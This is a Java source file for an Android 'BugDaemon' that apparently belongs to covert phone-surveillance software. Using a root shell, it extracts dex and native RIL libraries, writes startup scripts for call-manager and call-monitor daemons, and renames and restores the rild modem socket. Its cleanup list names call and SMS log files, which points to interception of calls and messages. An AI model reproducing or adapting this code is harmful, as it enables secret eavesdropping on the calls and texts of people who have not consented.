package com.vvt.callmanager.ref;

import java.io.File;
import java.util.ArrayList;

import com.fx.daemon.Daemon;
import com.fx.daemon.DaemonHelper;
import com.vvt.logger.FxLog;
import com.vvt.shell.CannotGetRootShellException;
import com.vvt.shell.LinuxFile;
import com.vvt.shell.Shell;
import com.vvt.shell.ShellUtil;

public class BugDaemon extends Daemon {
	
	private static final String TAG = "BugDaemon";
	
	private static final boolean LOGV = Customization.VERBOSE;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static ArrayList<File> sExtractingFileList;
	private static ArrayList<File> sRemovingFileList;

	@Override
	public String getTag() {
		return TAG;
	}

	/**
	 * This class cannot tell correct process name.
	 * Normally, being called by isAvailable() and stopDaemon(), which are already overridden
	 */
	@Override
	public String getProcessName() {
		return "bug-engine";
	}

	@Override
	public String getStartupScriptPath() {
		return BugDaemonResource.CallMon.STARTUP_SCRIPT_PATH;
	}

	@Override
	public boolean isAvailable() {
		return  ShellUtil.isProcessRunning(BugDaemonResource.CallMgr.PROCESS_NAME) &&
				ShellUtil.isProcessRunning(BugDaemonResource.CallMon.PROCESS_NAME);
	}
	
	@Override
	public void stopDaemon() {
		if (LOGV) FxLog.d(TAG, "stopBugDaemon # ENTER ...");
		
		try {
			if (LOGV) FxLog.d(TAG, "stopBugDaemon # Cleanup socket");
			cleanupRilSocket();
		}
		catch (CannotGetRootShellException e) {
			if (LOGE) FxLog.e(TAG, String.format("stopBugDaemon # Error: %s", e));
		}
		ShellUtil.killProcessByName(BugDaemonResource.CallMgr.PROCESS_NAME);
		ShellUtil.killProcessByName(BugDaemonResource.CallMon.PROCESS_NAME);
		
		if (LOGV) FxLog.d(TAG, "stopBugDaemon # ENTER ...");
	}
	
	@Override
	public void removeDaemon() throws CannotGetRootShellException {
		Shell rootShell = Shell.getRootShell();
		
		String cmd = String.format("rm %s/%s", 
				BugDaemonResource.EXTRACTING_PATH, 
				BugDaemonResource.CallMon.STARTUP_SCRIPT_PATH);
		rootShell.exec(cmd);
		
		cmd = String.format("rm %s/%s", 
				BugDaemonResource.EXTRACTING_PATH, 
				BugDaemonResource.CallMgr.STARTUP_SCRIPT_PATH);
		rootShell.exec(cmd);
		
		super.removeDaemon();
	}
	
	/**
	 * Create startup script for both process e.g. callmgrd and callmond
	 */
	@Override
	protected void createStartupScript() throws Exception {
		String callMonStartupScript = createCallMonStartupScript();
		createStartupScriptFile(BugDaemonResource.CallMon.STARTUP_SCRIPT_PATH, callMonStartupScript);
		
		String callMgrStartupScript = createCallMgrStartupScript();
		createStartupScriptFile(BugDaemonResource.CallMgr.STARTUP_SCRIPT_PATH, callMgrStartupScript);
	}

	@Override
	protected ArrayList<File> getExtractingFileList() {
		if (sExtractingFileList == null) {
			
			sExtractingFileList = new ArrayList<File>();
			
			sExtractingFileList.add(new File(
					BugDaemonResource.EXTRACTING_PATH, 
					BugDaemonResource.DEX_ZIP_FILENAME));
			
			sExtractingFileList.add(new File(
					BugDaemonResource.EXTRACTING_PATH, 
					BugDaemonResource.SECURITY_CONFIG_FILE));
			
			sExtractingFileList.add(new File(
					BugDaemonResource.NATIVE_LIBS_PATH, 
					BugDaemonResource.LIB_RIL_FILE));
			
			sExtractingFileList.add(new File(
					BugDaemonResource.NATIVE_LIBS_PATH, 
					Shell.LIB_EXEC_FILE));
		}
		
		return sExtractingFileList;
	}

	@Override
	protected ArrayList<File> getRemovingFileList() {
		if (sRemovingFileList == null) {
			
			if (sExtractingFileList == null) {
				getExtractingFileList();
			}
			
			sRemovingFileList = new ArrayList<File>();
			sRemovingFileList.addAll(sExtractingFileList);
			sRemovingFileList.add(new File(
					BugDaemonResource.CallMgr.STARTUP_SCRIPT_PATH));
			sRemovingFileList.add(new File(
					BugDaemonResource.CallMon.STARTUP_SCRIPT_PATH));
			sRemovingFileList.add(new File(
					BugDaemonResource.LOG_FOLDER, 
					BugDaemonResource.LOG_FILENAME + "*"));
			sRemovingFileList.add(new File(
					BugDaemonResource.PERSISTED_NETWORK_TYPE_PATH));
			sRemovingFileList.add(new File(
					BugDaemonResource.LOG_FOLDER, 
					BugDaemonResource.AT_LOG_CALL_FILE + "*"));
			sRemovingFileList.add(new File(
					BugDaemonResource.LOG_FOLDER,
					BugDaemonResource.AT_LOG_SMS_FILE + "*"));
		}
		
		return sRemovingFileList;
	}

	private String createCallMonStartupScript() {
		if (LOGV) FxLog.v(TAG, "createStartupScript # ENTER ...");
		
		StringBuilder script = new StringBuilder();
		script.append("#script\n");
		
		// Define reference library:-
		// export LD_LIBRARY_PATH=/system/lib:/data/misc/dm\n (use ':' when using multiple libs)
		StringBuilder builder = new StringBuilder(DaemonHelper.SYSTEM_LIB_PATH);
		if (! DaemonHelper.SYSTEM_LIB_PATH.equals(BugDaemonResource.NATIVE_LIBS_PATH)) {
			builder.append(":").append(BugDaemonResource.NATIVE_LIBS_PATH);
		}
		script.append(String.format(FORMAT_LIBRARY, builder.toString()));
		
		// Define class path:- 
		// export CLASSPATH=<extracting path>/<zip file>;
		script.append(String.format(
				FORMAT_CLASSPATH, 
				BugDaemonResource.EXTRACTING_PATH, 
				BugDaemonResource.DEX_ZIP_FILENAME));
		
		// Define Main:-
		// app_process /system/bin <main class> \\$* &
		script.append(String.format(FORMAT_APP_PROCESS, BugDaemonResource.CallMon.MAIN_CLASS));
		
		String result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Startup Script:-\n%s", result));
		
		if (LOGV) FxLog.v(TAG, "createStartupScript # EXIT ...");
		return result;
	}
	
	private String createCallMgrStartupScript() {
		if (LOGV) FxLog.v(TAG, "createStartupScript # ENTER ...");
		
		StringBuilder script = new StringBuilder();
		script.append("#script\n");
		
		// Define reference library:-
		// export LD_LIBRARY_PATH=/system/lib:<extracting path>
		StringBuilder builder = new StringBuilder(DaemonHelper.SYSTEM_LIB_PATH);
		if (! DaemonHelper.SYSTEM_LIB_PATH.equals(BugDaemonResource.NATIVE_LIBS_PATH)) {
			builder.append(":").append(BugDaemonResource.NATIVE_LIBS_PATH);
		}
		script.append(String.format(FORMAT_LIBRARY, builder.toString()));
		
		// Define class path:- 
		// export CLASSPATH=<extracting path>/<zip file>;
		script.append(String.format(
				FORMAT_CLASSPATH, 
				BugDaemonResource.EXTRACTING_PATH, 
				BugDaemonResource.DEX_ZIP_FILENAME));
		
		// Define Main:-
		// app_process /system/bin <main class> \\$* &
		script.append(String.format(FORMAT_APP_PROCESS, BugDaemonResource.CallMgr.MAIN_CLASS));
		
		String result = script.toString();
		if (LOGV) FxLog.v(TAG, String.format("Startup Script:-\n%s", result));
		
		if (LOGV) FxLog.v(TAG, "createStartupScript # EXIT ...");
		return result;
	}
	
	public static void cleanupRilSocket() throws CannotGetRootShellException {
		if (LOGV) FxLog.v(TAG, "cleanupRilSocket # ENTER ...");
		
		ArrayList<LinuxFile> files = LinuxFile.getFileList(
				String.format("%s*", BugDaemonResource.RIL_SOCKET_ORIGINAL_PATH));
		
		boolean foundRild = false;
		boolean isRildDummy = false;
		boolean foundRildr = false;
		
		LinuxFile rild = null;
		LinuxFile rildr = null;
		
		for (LinuxFile f : files) {
			if ((BugDaemonResource.ORIGINAL_SOCKET.equals(f.getName()))) {
				foundRild = true;
				rild = f;
			}
			if ((BugDaemonResource.TERMINAL_SOCKET.equals(f.getName()))) {
				foundRildr = true;
				rildr = f;
			}
		}
		
		if (!foundRild && !foundRildr) {
			if (LOGV) FxLog.v(TAG, "cleanupRilSocket # Sockets not found!! -> EXIT ...");
			return;
		}
		
		Shell shell = Shell.getRootShell();
		
		// Manage rild
		if (foundRild && rild != null) {
			isRildDummy = rild.canAnyoneRead() && rild.canAnyoneWrite();
			
			if (isRildDummy) {
				shell.exec(String.format("rm %s", BugDaemonResource.RIL_SOCKET_ORIGINAL_PATH));
				if (LOGD) FxLog.d(TAG, String.format(
						"cleanupRilSocket # %s is removed!!", 
						BugDaemonResource.RIL_SOCKET_ORIGINAL_PATH));
			}
		}
		
		// Manage rildr
		if (foundRildr && rildr != null) {
			boolean isDummy = rildr.canAnyoneRead() && rildr.canAnyoneWrite();
			
			boolean isOutdated = foundRild && !isRildDummy;
			
			// rildr can be outdated if ril is restarted and create a new one. 
			if (isDummy || isOutdated) {
				shell.exec(String.format("rm %s", BugDaemonResource.RIL_SOCKET_RENAMED_PATH));
				if (LOGD) FxLog.d(TAG, String.format(
						"cleanupRilSocket # %s is removed!!", 
						BugDaemonResource.RIL_SOCKET_RENAMED_PATH));
			}
			else {
				shell.exec(String.format("mv %s %s", 
						BugDaemonResource.RIL_SOCKET_RENAMED_PATH, 
						BugDaemonResource.RIL_SOCKET_ORIGINAL_PATH));
				if (LOGD) FxLog.d(TAG, "cleanupRilSocket # rild socket is restored");
			}
		}
		
		shell.exec(String.format("chmod 755 %s", BugDaemonResource.SOCKET_PATH));
		if (LOGD) FxLog.d(TAG, "cleanupRilSocket # Socket folder permission is restored");
		
		// No need to restart "com.android.phone" here.
		// The socket will be found automatically.
		shell.terminate();
		
		if (LOGV) FxLog.v(TAG, "cleanupRilSocket # EXIT ...");
	}

}
